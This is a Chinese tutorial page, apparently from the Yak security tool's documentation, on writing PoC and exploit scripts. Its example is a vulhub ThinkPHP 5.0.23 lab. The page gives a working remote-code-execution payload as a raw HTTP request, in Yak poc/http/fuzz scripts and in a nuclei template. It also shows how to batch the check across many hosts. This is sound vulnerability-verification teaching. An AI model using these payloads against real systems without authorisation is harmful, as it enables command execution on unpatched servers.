---
sidebar_position: 11
---

# 如何编写优秀的 PoC/Exp 👻

大家都很清楚，如果想要验证一个漏洞，我们需要针对这个漏洞进行一系列的探索和研究。经过研究成因和原理之后，我们通常希望得到如下结论作为输出：

1. 漏洞的研究报告
1. 漏洞的 PoC（概念性验证）：可以简单理解为一段可以验证一个目标是否存在这个漏洞的程序/代码/脚本。
1. 漏洞的利用方式：对这个漏洞造成危害的利用和实践。

## 编写优秀的 Web 漏洞 PoC 的关键：

1. 代码本身的健壮性，代码本身最好不能有导致无法运行漏洞检测的 BUG。
1. 针对复杂输入的兼容：
    1. 减轻用户甄别的负担：如果要求的是主机+端口，则能把 URL 等输入自动解析成想要的格式
    1. 如果目标是特定路径的 URL，要可以能解析输入的 IP 以及默认端口等信息，组合出合理的 URL
    1. 如果扫描目标的 URL 不固定，需要页面多个 URL 来作为输入都进行漏洞检测，则可以使用爬虫模块或编写更详细的逻辑来确定扫描目标。
    1. 用户输入的 URL 路径，尽量通过 `str.UrlJoin()` 来连接。
1. 可规模化验证：
    1. 为了解决速度问题，可以尝试在漏洞检测之前编写简单的指纹识别，筛除一些不合理的目标
    1. 常量可以作为全局变量，变量不应该作为全局变量

## Yak 中可以用来编写 PoC/Exp 的模块

1. 【最推荐】[`poc` 最简单的方案进行 PoC 发包](/api-manual/api/poc)
1. [`http` 模块用于发最基础的 HTTP 请求](/api-manual/buildinlibs/lib_http)
1. [`fuzz` 用于构造可用于模糊测试的 HTTP 请求](/api-manual/buildinlibs/lib_fuzz)
1. [`nuclei` 构造适配于 nuclei yaml poc 的 PoC](/api-manual/buildinlibs/lib_nuclei)

## 在 Yak 中，如何编写 PoC？

编写 PoC 虽然只是 Yak 的一个单一的用途，但是并不意味着我们对这个功能是不重视的。

:::tip

细心的朋友一经发现了，我们有意把这一节的内容放在了几乎是整个安全研发教程的结尾。

意图很明显：我们想告诉用户，PoC 的编写，并不真的只靠用户自己去编写所有逻辑

1. 如果你的 PoC 需要用到爬虫，那 Yak 有爬虫可以帮助你 [`crawler` 使用教程](/api-manual/buildinlibs/lib_crawler)
1. 如果你的 PoC 需要条件竞争，[`那就用 `fuzz` 模块`](/api-manual/buildinlibs/lib_fuzz)
1. 如果你的会写 nuclei yaml poc，那么也可以把你的 PoC [`直接交给 nuclei 模块去扫描`](/api-manual/buildinlibs/lib_nuclei)

:::

在编写 PoC 的时候，我们将给大家讲解同一个 PoC 的三种写法，哪一种写法都可以，大家可以自行选用最方便的。

### 选择漏洞，构建靶场

**注意: 我们使用 [`vulhub`中 ThinkPHP 框架的靶场作为目标靶场](https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce)**

通过对靶场的了解，我们通过

```bash
git clone https://github.com/vulhub/vulhub --depth 1
cd vulhub/thinkphp/5.0.23-rce
docker-compose up -d
```

来启动靶场，然后阅读 `README`，我们发现以下数据包是关键 PoC

```http
POST /index.php?s=captcha HTTP/1.1
Host: localhost
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
```

针对这个数据包，我么可以有下面主要三种方法来构造 PoC，举最简单的例子。

### 使用 `poc` 构建 PoC

由于绝大部分的 Web 类 PoC 都是发送一个数据包，检查结果。因此我们可以定向针对这种情况做优化。

例如，我们可以精准替换掉数据包中参数的内容，而不需要专门去构造一个数据包的各种其他 "无关" 的参数。

最简单暴力的就是，我们直接发送一个数据包！

在如下例子中，我们通过 `func poc.HTTP(packetRaw: string|[]byte, extraParams ...opt) (responseRaw: []byte, requestRaw: []byte, err error)` 这个函数可以直接发送一个数据包。

遇到需要替换的部分，可以使用 `{{param(name)}}` 标签来标记，然后标记中 `param()` 中括号中的内容是我们需要替换的参数名称。

例如如下案例，我们在 `Host: {{param(target)}}` 中标记了参数，通过 `poc.HTTP(packet, http.params({"target": "localhost:8080"}))` 中的 `http.params` 可以替换掉标记的内容。

从而构建一个完整的数据包，这个数据包可以直接通过 `poc.HTTP` 发送出去，把最最原始的结果返回给用户。

返回的内容有三个参数，分别是

1. response 的原始数据包内容
1. request 原始数据包内容
1. error 失败原因（如果没有失败，这个值为 `nil`） 

具体代码如下

```go
rsp, req, err := poc.HTTP(`
POST /index.php?s=captcha HTTP/1.1
Host: {{param(target)}}
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
`, poc.params({
    "target": "localhost:8080",
}))
die(err)

if re.Match(`((uid\=\d*)|(gid\=\d*)|(groups=\d*))`, rsp) {
    println("found thinkphp vuls...")
    break
}
```

当然如果需要针对返回的数据包进行精细化处理，可以参考 [`poc` 辅助库中所有可用参数](/api-manual/api/poc)

### 使用 `http` 构造 PoC

如果一个 PoC 仅仅是特别基础的发送一个请求，根据返回的结果来判断是否存在漏洞，那么这个 PoC 的编写其实非常简单

```go
// 发送一个请求
rsp, err := http.Post(
    "http://127.0.0.1:8080/index.php?s=captcha",
    http.header("Content-Type", "application/x-www-form-urlencoded"),
    http.body(`_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id`),
)
if err != nil {
    die(err)
}

// 调试工具，可以看到原始相应包是啥。
// http.show(rsp)

// 把原始相应包打印出来
rawPacket, err := http.dump(rsp)
if err != nil {
    die(err)
}

// 编写一个正则，来判断期望的结果是否产生
if re.Match(`((uid\=\d*)|(gid\=\d*)|(groups=\d*))`, rawPacket/*type: any*/) {
    println("found thinkphp vul!")
}
```

我们发现，上面的代码其实非常容易让人理解，使用 http 库发送了一个构造特定 Payload 的请求。

然后使用一个规则来检测漏洞。

### 使用 `fuzz` 构造 PoC

作为对比，我们使用 `fuzz` 模块来构建更容易让人理解的 PoC；

这个方法比 `http` 更好的是：**我们可以直接把数据包直接复制在代码中，减少大家的理解和调试成本**

```go
fReq, err := fuzz.HTTPRequest(`
POST /index.php?s=captcha HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
`)
if err != nil {
    die(err)
}

reqs, err := fReq.Exec()
if err != nil {
    die(err)
}

for rsp = range reqs {
    if rsp.Error != nil {
        log.error(rsp.Error)
        continue
    }

    if re.Match(`((uid\=\d*)|(gid\=\d*)|(groups=\d*))`, rsp.ResponseRaw) {
        println("found thinkphp vuls...")
        break
    }
}
```

通过上述代码，我们可以很容易知道原始数据包是啥。通常我们可以直接把 `Burpsuite` 的数据包直接复制在这里，然后直接编写需要检测的正则即可。

:::caution

原始数据包将会自动修复一些可能的错误，比如说数据包前的空行，自动修正 Content-Length，根据 Host 启动提取需要访问的目标。

所以用户不必严格追去数据包的格式必须怎么样，Yak 的 `fuzz` 能自动修正一部分数据包的错误

:::

### 使用 `nuclei` 编写 PoC

如果是担心 Yak 编写 PoC 会并不那么通用，或者 Yak 的分享渠道并不能满足用户的需求，那么用户可以考虑使用 `nuclei` 的 PoC 编写

我们直接使用

```go
res, err := nuclei.Scan("http://127.0.0.1:8080", nuclei.tags("thinkphp"))
die(err)
for r := range res {
   dump(r)
}
```

即可调用到我们设置了相应 Tag 的 PoC。[`nuclei-templates` 中 Thinkphp 的 PoC](https://github.com/projectdiscovery/nuclei-templates/blob/3ef39c173e4cc1937158c6ad9ab30d2f2e7366d1/vulnerabilities/thinkphp/thinkphp-5023-rce.yaml)

PoC 样例如下：

```yaml
id: thinkphp-5023-rce

info:
  name: ThinkPHP 5.0.23 RCE
  author: dr_set
  severity: critical
  description: Thinkphp5 5.0(<5.0.24) Remote Code Execution.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5.0.23-rce
  tags: thinkphp,rce

requests:
  - method: POST
    path:
      - "{{BaseURL}}/index.php?s=captcha"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "PHP Extension"
          - "PHP Version"
        condition: and
      - type: status
        status:
          - 200
```

:::tip
如果大家想要寻找如何编写一个 Nuclei Yaml PoC，[教程在这里](https://nuclei.projectdiscovery.io/templating-guide/)
:::

## 漏洞 PoC `规模化/武器化`

我们通过上面的简单教程，学会了如何编写一个 Yak/Nuclei 版本的 PoC，但是我们发现，上述的代码其实并不是特别可用。主要原因有下面几个：

1. 我们的目标特别多怎么办？ 
1. 我们有些参数需要动态化怎么办？
1. 用户如果只输入了一个盲目的网站 IP + 端口怎么办？
1. ...

我们发现，如果想要让这个 PoC 尽可能真的能扫到目标，其实我们要做的事情，也并不少。


### 回顾一下我们在 `fuzz` 中学习的技能

```go
fReq, err := fuzz.HTTPRequest(`
POST /index.php?s=captcha HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
`)
if err != nil {
    die(err)
}
```

当我们构建了一个可供 Fuzz 的请求之后，我们很容易对这个请求进行变形：

1. 如果要调整他的扫描目标，我们就 `.FuzzHTTPHeader("Host", targets)` 替换掉 Host。
1. 如果说我们要调整 Payload，就 `.FuzzPostParams("server[REQUEST_METHOD]", ["id", "uname"])` 更新想要执行的命令。

```go
rsp, err := fReq.FuzzHTTPHeader("Host", sprintf("{{net(%v)}}:{{port(%v)}}", host, port)).FuzzPostParams("server[REQUEST_METHOD]", ["id", "uname"]).Exec()
die(err)
```

所以，我们对这个 Payload 进行了 Fuzz，同时替换了一些关键的参数

:::tip

这么做的好处不言而喻，我们使用 `fuzz` 模块，可以做到尽量少修改 PoC 源码的情况下，外部修改请求参数从而达到修改最终发出的数据包的目的。

:::

### 其次我们解决批量调用的问题，函数化+模块化

函数/模块化我们需要用到的核心功能是 [Yak 中的 `import` 函数](/docs/yak-basic/modules) 

根据我们的 `import` 的全局函数，我们可以把我们的代码，封装成为一个可供别的脚本调用的函数，使用 `cli` 来接受用户输入的参数。

```go title="thinkphp-poc.yak"
def poc(host, port) {
   fReq, err := fuzz.HTTPRequest(`
   POST /index.php?s=captcha HTTP/1.1
   Host: localhost:8080
   User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
   Connection: close
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 72
   
   _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
   `)
   if err != nil {
       log.error(err)
       return false
   }
   
   rsp, err := fReq.FuzzHTTPHeader("Host", sprintf("{{net(%v)}}:{{port(%v)}}", host, port)).FuzzPostParams("server[REQUEST_METHOD]", ["id", "uname"]).Exec()
   if err != nil {
      log.error(err)
      return false
   }
   
   // match result
   // 
   //  DO Something
   return true
}

if YAK_MAIN {
   poc(cli.String("target"), cli.String("port"))
}
```

我们通过上述简单的处理，就可以做到封装一个 PoC，任何 Yak 脚本都可以通过 `import("thinkphp-poc", "poc")` 来导入执行函数，然后直接执行上述函数。

同时由于我们使用 `fuzz` 模块去模糊化了 `Host` 我们可以很轻易实现针对多个目标同时进行扫描。

## 结语

我们希望编写 Yak PoC 是一个包容的过程，我们不会限制用户的格式，也不需要用户自己去做复杂的依赖管理，遵循 Yak 的语法即可。

总之 Happy Game!